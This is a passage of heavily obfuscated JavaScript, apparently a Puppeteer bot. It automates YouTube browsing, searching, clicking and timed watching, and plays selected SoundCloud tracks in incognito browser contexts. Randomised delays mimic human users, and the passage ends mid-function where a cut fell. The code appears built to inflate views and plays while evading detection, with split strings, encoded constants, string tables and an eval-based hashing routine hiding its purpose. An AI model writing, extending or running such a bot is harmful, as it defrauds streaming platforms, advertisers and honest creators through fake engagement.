const Z = b,
  Y = d,
  X = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0xfd7 + -0x9b * 0x5 + 0x3 * -0x445))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x6 * 0x2aa + -0x1f61 + 0x1e5 * 0x19), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x77da + -0x83b * 0x11 + -0x69d * -0x39 + (0x4 * -0x1b85 + -0x1e36 + 0xc6e2) * random()) : await standardWaitForNetIdle(f), await wait(-0xda3 * -0x2 + 0xf9 * -0x27 + 0x1e31 + (0x2d37 + -0x1d * 0x24a + -0x1 * -0x3c3b) * random()), -0x2e * -0x1d + 0x1aac + -0x1fe1;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x161 + -0x1456 + 0x293f), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x7 * 0x2e3 + 0x223 * -0x3 + -0xdcb;
}
async function randomWait() {
  return await wait(-0x1f32 + 0x1 * 0x31b + 0x2f9f + (0xa7 * 0xb + 0x8 * 0x39b + 0x7 * -0x25b) * random()), 0x80b * 0x3 + 0xd * 0x137 + -0x27eb;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1c8a + 0x1cf8 + -0x22 * 0x1b1, -0x14d + 0x2 * 0x12d5 + 0x122b * -0x2), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x14f * -0x14 + -0x2519 * 0xa + 0x27786) * getRandomInt(0xc3 * 0xc + 0xb * 0x236 + -0x2174, 0x1 * 0x25f + -0x5db * -0x1 + -0x1 * 0x835), h)), 0x67 * 0x19 + -0x5 * -0x139 + -0x102b * 0x1;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = d,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1 * 0x39f + -0x19e5 + -0x1 * -0x1d84;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x36b + -0x14d4 + 0x20 * 0xc2][R(0x9)]('\x20');
    for (let k = 0x9a2 + -0x571 * -0x1 + 0x1 * -0xf13; k < i['length']; k += 0x527 * 0x1 + -0x5a7 * 0x1 + 0x41 * 0x2)
      j += i[k] * h[i[k + (-0x1b98 + 0x1 * -0x263e + 0x41d7)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0xee + -0x2580 + 0x6b * 0x5c)['map'](l => Array['from'](l['children']))['flat'](-0x8ab + 0xd3f * -0x1 + -0x15eb * -0x1)['map'](l => l['childNodes'][-0x1d1a + -0x6e2 + 0xbff * 0x3]['childNodes'][-0x11bb + 0x157d + -0x3c2]['childNodes'][0x5d3 + -0x17a + -0x458]['childNodes'][-0x2097 + 0x170a + 0x98d]['childNodes'][-0x16bb + -0x24ec + 0x3ba8]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x161b + 0x2 * -0x4ba + -0x8bf, -0x1 * -0x457 + -0x8c * -0x11 + 0x1f7 * 0x3)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x4ae * -0x1 + 0xd3 * 0x8b + -0x9 * 0x5b3);
  const h = await getMaxTime(f),
    i = Math['min']((0x10032 + 0x1 * -0x15fb + -0x29 * -0x1) * getRandomInt(0x13bd * -0x1 + -0x1b26 + -0x31 * -0xf5, -0x1db5 + 0x2529 + -0x76f), h);
  return await wait(i), 0x8b * 0x3b + -0x4cd * -0x1 + -0x24d5;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    const S = d;
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + S(0x7)))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x1 * -0x2eb + -0x587 + 0x872]['children'][0x628 + 0x21c9 + 0x7fd * -0x5]['children'][-0x2 * -0xa3b + 0x34b + -0x17c1]['children'][-0x1948 + -0x222e + 0x2b * 0x162]['children'][-0x1f2d * -0x1 + 0x514 + -0x1 * 0x2441]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x25a1 * -0x1 + -0x1cb + -0x23d5;
}
async function searchAndView(f) {
  const T = c;
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x9ff * 0x3 + -0xa3 * -0x5 + -0x1064 * 0x2 + (-0xc6f * 0x2 + -0x2259 + 0xe3 * 0x43) * random()
  }), await wait(0x2692 + 0x1 * 0x243b + 0x11 * -0x449 + (0x228d + -0x1 * 0x17c2 + 0x99f * -0x1) * random()), await f['click'](T(0x5) + 'on-legacy'), await async function j() {
    const U = b;
    if (!await f[U(0x19, ')XHX')](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x17 * -0x193 + 0x17d3 + 0x2 * -0x1e03]['childNodes'][-0x1fb2 + -0x6 * 0x319 + -0x10c3 * -0x3]['childNodes'][0xd * 0x263 + 0x1 * 0x121 + 0x2027 * -0x1]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x3 * 0x1b7 + 0x2d * 0x52 + -0x2 * 0x9c5]['childNodes'][-0x174a + 0xa95 + 0xcb5]['childNodes'][-0x199e * -0x1 + 0x131 + 0x1 * -0x1acd]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x1f83 + 0x880 * -0x1 + -0xc5 * -0x34),
          r = -0xd23 + -0x26f7 + 0x341a;
        for (let u = 0x1 * -0x820 + -0x4 * 0x49 + 0x4 * 0x251; u < q['length']; u += 0x192e + -0x4 * -0x76 + -0x1b04)
          r += q[u] * k[q[u + (0x1e20 + 0x4 * -0x57d + -0x82b)]];
        return r;
      }(n);
  });
  await wait((0x4c5c + 0x5a46 + 0x2 * -0x3605) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x2e * -0x8c3 + 0x19d89 + -0x25 * -0x60d) * getRandomInt(-0xa79 * 0x1 + -0x413 * -0x1 + 0x1 * 0x667, 0x3b8 + 0x1 * 0xc84 + 0x566 * -0x3), h + (-0x155 * -0x17 + -0x2 * 0xd7 + -0x96d));
  return await wait(i), 0x3 * 0xce5 + -0x1 * 0x200c + -0x2 * 0x351;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), -0x3f * -0x4e + 0x1 * -0x7a + -0x12b8 * 0x1), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x1fe8 + 0x1e91 * -0x1 + 0x4a31 + (0x1ada + -0xed5 + 0x43 * -0x1f) * Math['random']());
    });
  }, 0x1f79 + -0x1df5 * 0x1 + 0x19d4);
  await wait(-0x369 * 0xed + -0x79603 + 0xf5218);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0xbe06 + 0x7c48 + 0x2 * -0x27f7) * getRandomInt(0x103a + -0x1176 + 0x40 * 0x5, 0x26d * -0x6 + -0x1 * -0x249 + 0xc5e)), clearInterval(h), -0x1833 + 0x1404 + 0x10 * 0x43;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x4 * 0x349 + 0x2 * 0xabd + -0x229e;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xc61 + 0x1a08 + -0xda6;
    await randomWait();
  }
  return -0x1 * -0x21ea + 0x1 * 0x1c4d + 0x3e36 * -0x1;
}

function fetchRandomSC() {
  return Math['random']() <= -0x1e02 + 0x1730 + 0x6d2 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x3df + -0xed8 + -0xaf9 * -0x1 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function a() {
  const bl = [
    'emoYW6lcOt/cMmkqfg4p',
    'CJCuFa4',
    'jtLbjtG0juu4jq',
    'WOhdTSkbd2VdJSkJsSoYyW',
    'y8k5W5NcO8o5xYdcQSo7',
    'i3nLyxjJAc1PyW',
    'W7NcNrFcMGxdLISDneK',
    '-grid-row',
    '8%E5%A2%9E',
    'split',
    'qEPTydgwh4',
    'MSgZhNCwff',
    'Ahr0Chm6lY9NCG',
    'zg9dCMvHDgvtzq',
    'WQRcJs0AA8kzF8k+u8kf',
    'https://gi',
    'iW0wAWzoohRdGgm',
    'BMCSC3vUBNL2mG',
    'ndrSuLzzutm4rq',
    'Aw4TEw91CI1JCW',
    'pts/430253',
    'kYOzhfhcQW',
    'WQlcLay',
    'bts,bts\x20v,',
    'WQ9Otmk1xe0ZW5yYoa',
    'W6GaictcVCo9WQhdSG'
  ];
  a = function() {
    return bl;
  };
  return a();
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0x256a * -0x1 + -0x140b + -0x115f + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0x2f * 0x39 + -0x21bb + 0x2c32;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0xd3f8 + -0x1 * -0x18fd + 0x1 * -0x3d2d + getRandomInt(0x494 + 0x67ca * 0x1 + -0x2e * 0x115, -0x2898 + -0x62f * 0x1d + 0x1511b));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0xbeb * -0x3 + -0x1d76 + -0x1 * 0x64a), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x1 * 0x9d4 + 0x1dde * 0x1 + 0x1b * -0xbe;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](-0x2151 * -0x1 + 0xcf7 + -0x2e48, 0xa6 * -0x2b + -0x1a3f + 0x3653)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0x14c3 + 0x6bf + -0x15d4 * -0x1 + floor((0xc89 * -0x3 + -0x8f1 + 0xc9d * 0x4) * random()))), log('p2'), log(await s['evaluate'](() => {
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(0x1 * 0x1ab2318 + -0x2 * 0x7502eb42 + -0x2 * -0xb42d59b6),
          0xc35901 + -0x56c9d0 + 0x7 * 0x2c6f9,
          -0xdbdd + 0x1cf * -0x6b + 0x21d62,
          0x1d89 + 0x173b + 0xa74 * -0x5
        ], y = [
          0x1 * 0x1643 + 0xb * 0x269 + 0x6 * -0x81d,
          0x24 * 0x4a + -0x2 * -0x825 + -0x7 * 0x3ce,
          0x2 * 0x97a + 0x18f1 + -0x2bdd,
          0x1 * 0x152f + -0x115d + 0x1 * -0x3d2
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x2272 + 0x1e41 + 0x166 * 0x3)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1d53 + -0x1 * 0x254b + -0x214f * -0x2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              const V = b;
              if (V(0x15, '&7KE') == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xdf * 0x14 + 0x13ec + -0x280) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[0x1 * 0x12f + 0x35 * -0x4 + 0xd * -0x7] = A[0x12 * 0x12a + -0x403 + -0x10e1] = A[0xd * -0xf6 + 0x88 + -0x3 * -0x3fd] = A[-0x11bf * -0x1 + -0x59 * 0x3a + -0x26d * -0x1] = A[0x1 * -0xb53 + 0xcc0 + -0x16a] = A[0x6e0 + -0x1 * -0xfc1 + -0x169d] = A[-0x124f * 0x1 + 0x5fe + 0x2 * 0x62b] = A[-0x1 * -0x581 + -0x282 * -0xb + -0x2111] = A[-0x5 * 0xfe + 0x1e98 + -0x17 * 0x11d] = A[-0x1ac + -0x2533 + -0x1b1 * -0x17] = A[-0x21a3 + 0x6 * 0x657 + 0x56 * -0xd] = A[0xc73 + -0x188a + 0xcf * 0xf] = A[0x1115 * -0x1 + -0x1d79 + -0x1 * -0x2e99] = A[0x62a + -0x944 + -0x1f * -0x1a] = A[-0x8 * -0xc5 + -0xcc6 + -0x1 * -0x6ab] = A[-0x19c1 + -0x10c7 * -0x2 + 0x7bf * -0x1] = A[-0x31 * 0x76 + -0x5 * -0x23b + 0xb7e] = -0x13ff * -0x1 + 0x1af * -0x17 + 0x12ba, this['blocks'] = A) : this['blocks'] = [
                -0xd * -0x1c + -0x3 * 0xafa + 0x1f82,
                -0x13 * 0x207 + 0x1 * -0xd23 + 0x33a8,
                -0x1 * 0x17a3 + 0xb0d + 0xc96,
                -0x29f * -0x1 + 0x1 * -0x71a + 0x47b,
                0x1 * 0x513 + -0x16c9 + 0x11b6,
                0xfac + 0x949 + -0x1 * 0x18f5,
                -0x109f + 0xc7 * 0x3 + 0x725 * 0x2,
                0x215 + 0x4 * -0x1b4 + 0x1 * 0x4bb,
                -0x1 * 0x6f5 + -0x1eb + 0x47 * 0x20,
                0x1e46 + 0xcb9 * 0x3 + -0x7 * 0x9c7,
                -0x1 * 0x3ed + -0x1a3 * -0xd + -0x2 * 0x8ad,
                0x1 * 0x42 + -0xd32 * -0x1 + 0x29 * -0x54,
                -0x1 * -0x1597 + 0x147e + -0x1 * 0x2a15,
                0x18d + 0x1fe6 + 0x1 * -0x2173,
                -0x8b7 + -0x8c2 * 0x2 + -0x1a3b * -0x1,
                0x6 * 0x40 + -0x28e + 0x10e,
                -0x133f + -0x36 * -0xb9 + -0x13c7
              ], this['h0'] = -0xa5e51203 + -0x3fbbd877 + -0x14ce60d7b * -0x1, this['h1'] = 0x60e63ab7 + -0x13 * 0x1091dffd + 0x21 * 0xddee179, this['h2'] = 0xa9938a72 + 0x106c5fb0b * 0x1 + -0x1179ea87f, this['h3'] = 0x1930e767 * 0x1 + 0x63252b2 + -0xf30e5a3 * 0x1, this['h4'] = 0xaa1bb795 + -0xb708b87f * 0x2 + 0x187c89b59, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x768 * 0x1 + 0x1c29 + -0x14c1, this['finalized'] = this['hashed'] = -0x226d + 0xf4 * 0x1e + 0x5d5, this['first'] = -0x1 * 0xee7 + -0x49 * -0x9 + 0xc57;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * -0x1a5f + -0x44b + -0x1614, O = J['length'] || -0x1 * -0x989 + -0x1ba * -0x11 + -0x26e3, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0xc6f + -0x1f * -0x8b + -0x466, P[-0x4b * -0x3 + -0x14bf + 0x13de] = this['block'], P[-0x7ed * 0x2 + -0x2b * 0x1d + 0x1 * 0x14c9] = P[0x1 * -0xfd4 + -0x1 * -0x435 + 0xba0] = P[-0x10 * -0x161 + 0x15a5 + -0x2bb3] = P[0x26b1 + 0x1011 + -0x36bf] = P[-0x753 + -0x1895 + 0x24 * 0xe3] = P[0x237d + -0x3f6 + -0xda * 0x25] = P[0xbb8 * -0x1 + -0x5 * -0x579 + -0xf9f] = P[-0x8 * -0x61 + -0x1 * -0x243f + -0x13a * 0x20] = P[-0x1 * -0x76b + -0x35 + -0x72e] = P[0x156f + 0x3ae * -0x8 + 0x80a] = P[-0x2 * -0x511 + -0x23be + 0x19a6] = P[0x15a * 0x8 + 0x1718 + -0x21dd] = P[-0x2 * -0x6b + 0x41 * 0x61 + -0x196b] = P[-0xd68 + 0x25b7 + 0x36 * -0x73] = P[0x59b * -0x1 + 0x2 * 0xe68 + -0x1727] = P[-0x18ff + 0x2466 * -0x1 + 0x3d74] = 0x2b4 + -0x659 + 0x3 * 0x137), K) {
                    for (N = this['start']; M < O && N < -0x4e * 0x7b + -0x10f + -0x26c9 * -0x1; ++M)
                      P[N >> -0x738 + 0x4 * -0x12b + 0xbe6] |= J[M] << y[-0x1 * 0x1b55 + 0x2 * -0x452 + 0x23fc & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x243d + 0xaea * 0x2 + 0xea9; ++M)
                      (L = J['charCodeAt'](M)) < -0x20e0 + -0x1942 + 0x3aa2 ? P[N >> 0x2341 + 0x1d7e + -0x40bd] |= L << y[0x1f11 + -0x129 * 0x1a + -0x13 * 0xc & N++] : L < -0x3 * -0xb57 + -0x2e7 * -0xd + -0x3fc0 ? (P[N >> 0xd * 0x1fd + 0x1 * 0xd4d + -0x3c * 0xa7] |= (-0x24df * 0x1 + -0x1ff7 + 0x4596 | L >> -0x1a1 + -0x1ebd + 0x2064) << y[0x1f54 + 0x262f + -0x4580 & N++], P[N >> -0x30c + -0x1 * -0x1db6 + 0xd54 * -0x2] |= (-0x52c * 0x2 + 0xc3 * -0x27 + 0x7 * 0x5cb | 0x1bd4 + -0x1 * 0x25ab + 0xa16 * 0x1 & L) << y[-0x1 * -0x1e4e + -0x103b + 0x3 * -0x4b0 & N++]) : L < -0xa4d5 + -0x8 * 0x2b41 + 0x2d6dd || L >= 0x142e7 + -0xae68 + 0x33 * 0x17b ? (P[N >> 0x14d + -0x373 + 0x17 * 0x18] |= (0x65 * 0x35 + -0xc7f + -0x5 * 0x182 | L >> -0x7 * -0x1e7 + -0x15e + -0xbe7) << y[0x2034 + 0x1 * 0x224f + -0x130 * 0x38 & N++], P[N >> 0xc1c + -0xc94 + -0x2 * -0x3d] |= (0xad + 0x10de + -0x110b | L >> 0xdd * 0x10 + -0x3 * 0xa66 + 0x1168 & -0x3d3 + -0x4 * -0x4c6 + 0x1 * -0xf06) << y[-0xc7d * 0x1 + 0x1 * -0xb93 + -0x1813 * -0x1 & N++], P[N >> 0x21cb + 0x2 * -0x2be + -0x5a9 * 0x5] |= (0x8c5 * -0x2 + 0x1065 + -0x1 * -0x1a5 | -0x197a + -0x326 + 0x1cdf & L) << y[0x68a * 0x1 + -0x2b * -0xe5 + -0x2cfe & N++]) : (L = -0x8 * 0x1de6 + -0x188ce + 0x377fe + ((0x14 * -0x2e + 0x1f5b + 0x12 * -0x152 & L) << -0x1625 * -0x1 + -0xf0 + 0x152b * -0x1 | 0x1ca9 + -0x15f7 + -0x2b3 & J['charCodeAt'](++M)), P[N >> -0x14f8 + -0x6 * 0x658 + 0x3b0a] |= (-0x850 + -0xf31 * -0x2 + 0x21d * -0xa | L >> 0x1 * -0x254b + -0xd5a + 0x32b7) << y[0x1 * -0x1c81 + 0x2bf * 0x8 + -0x346 * -0x2 & N++], P[N >> -0x2686 + -0x9a * 0x27 + 0x3dfe] |= (-0x4 * 0x239 + -0x5 * -0x1cd + 0x63 | L >> 0x97a * -0x3 + -0x61 * -0x43 + 0x317 & 0x2207 + 0x1610 + -0x37d8) << y[0x133f + 0x2 * 0xfa3 + -0x3282 & N++], P[N >> 0x501 + -0x1 * -0x17c1 + -0xa * 0x2e0] |= (0x1ef + -0xef4 + 0x1 * 0xd85 | L >> -0xc99 + 0x2 * -0x187 + 0xfad & 0x3ba + 0x1d93 + 0x210e * -0x1) << y[-0x2 * -0x1310 + -0x3 * 0x140 + 0x13 * -0x1cf & N++], P[N >> 0x248f * -0x1 + -0xee0 + -0x1 * -0x3371] |= (-0x1 * 0x696 + -0x1 * 0x24af + 0x2bc5 | -0x21a6 + 0xa1d + 0x17c8 & L) << y[0x1ef + 0x1 * -0x11a + -0x69 * 0x2 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x169e + -0x3 * 0x70e + 0xb02 * 0x4 ? (this['block'] = P[0x1 * 0x1bef + -0x15f3 + -0x5ec], this['start'] = N - (-0x2a6 * 0x3 + -0x1143 + 0x1975), this['hash'](), this['hashed'] = 0x4 * -0x91 + -0x62 * 0x62 + 0x27c9) : this['start'] = N;
                }
                return this['bytes'] > -0x1955b42c3 + 0x1073 * 0x114835 + 0x1791482f3 && (this['hBytes'] += this['bytes'] / (0xfa42c6b2 * -0x2 + 0xf2c2f4ce * -0x2 + -0x70e9c500 * -0xb) << 0x1d11 + 0x264e + -0x435f, this['bytes'] = this['bytes'] % (-0x19c901f28 + 0x4 * -0xbc314d3 + -0x1c7b66a * -0x192)), this;
              }
            }
            ['finalize']() {
              const W = b;
              if (!this['finalized']) {
                this['finalized'] = -0x1ca7 + -0x10ab + 0x11b * 0x29;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x163 * 0x16 + -0x281 + 0x1 * 0x2113] = this['block'], J[K >> -0x7 * -0x85 + -0xbb8 + 0x817 * 0x1] |= x[-0x1 * -0x1835 + 0x1dbd + 0x1 * -0x35ef & K], this['block'] = J[-0x1779 * 0x1 + 0x43 * 0x11 + 0x1316], K >= -0x4f * -0x46 + 0xcf + -0x1631 && (this['hashed'] || this['hash'](), J[0xa * -0x19a + 0x2521 * -0x1 + 0x3 * 0x11b7] = this[W(0x1, 'zW**')], J[-0x8c7 + -0x488 + 0x3 * 0x475] = J[0x2097 + 0x1c31 + -0x3cc7 * 0x1] = J[0x266 * 0x4 + -0x2cf * 0x5 + -0x475 * -0x1] = J[-0x2e3 + -0x3 * -0x755 + -0x1 * 0x1319] = J[-0x1 * -0x409 + -0x1 * 0x375 + -0x1 * 0x90] = J[-0x1 * 0x103e + -0x71b + -0xbaf * -0x2] = J[0x1 * 0x257d + -0x21bb + -0x3bc] = J[-0x2 * 0x7f9 + 0xcbd * -0x1 + 0x1cb6] = J[0xf45 + 0x193 + -0x10d0] = J[-0xb50 + -0x25 * -0x5e + -0x23d] = J[-0x1dbd + 0x2 * 0xdc3 + 0x241] = J[0x1e * 0xf2 + 0x1 * -0xa45 + -0x120c] = J[-0x147 * 0xd + 0x1c29 + -0xb82] = J[0x20 * -0xe9 + -0x8e * 0x45 + 0x22d * 0x1f] = J[-0x69d * 0x1 + 0x1d * -0xe + 0x841] = J[0x5a1 + 0x3 * 0x2cf + -0x1 * 0xdff] = -0x2b * 0xb3 + 0x1 * -0x141b + 0x322c), J[0xc50 + 0x23db + 0x301d * -0x1] = this['hBytes'] << -0x172e + -0x27 * 0xe + 0x1 * 0x1953 | this['bytes'] >>> -0x768 + -0x7bd * 0x5 + 0x69a * 0x7, J[0x790 + -0x21a2 + 0x1a21] = this['bytes'] << -0x4f * -0x6 + -0x6b6 * -0x5 + -0x2365, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x792 + 0xe5 * 0x9 + -0xf8f; J < -0x1e66 + 0x1227 + 0x1 * 0xc8f; ++J)
